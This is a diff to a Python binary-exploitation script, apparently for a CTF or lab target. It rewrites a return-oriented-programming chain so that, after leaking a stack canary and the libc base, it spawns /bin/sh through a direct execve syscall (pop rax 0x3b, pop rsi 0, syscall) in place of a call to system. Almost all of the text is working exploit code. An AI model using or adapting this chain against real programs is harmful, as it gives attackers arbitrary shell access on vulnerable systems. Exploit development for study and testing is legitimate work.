@@ -55,8 +55,14 @@ class Exploit:
         # ROP chain
         payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rdi","ret"])[0])
         payload += pack("<Q", libc_address+next(libc.search(b'/bin/sh\x00')))
-        payload += pack("<Q", libc_address+libc_rop.find_gadget(["ret"])[0])
-        payload += pack("<Q", libc_address+libc.symbols.system)
+        
+        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rax","ret"])[0])
+        payload += pack("<Q", 0x3b)
+        
+        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rsi","ret"])[0])
+        payload += pack("<Q", 0x0)
+        
+        payload += pack("<Q", libc_address+libc_rop.find_gadget(["syscall"])[0])
         
         # Sending the payload
         proc.recv(100)
@@ -69,6 +75,5 @@ class Exploit:
         with eval(self.p) as r:
             canary, libc_address = self.get_canary_and_libc(r)
             self.return_to_libc(r, canary, libc_address)
-            
 
 Exploit(local=True, debug=False).start()
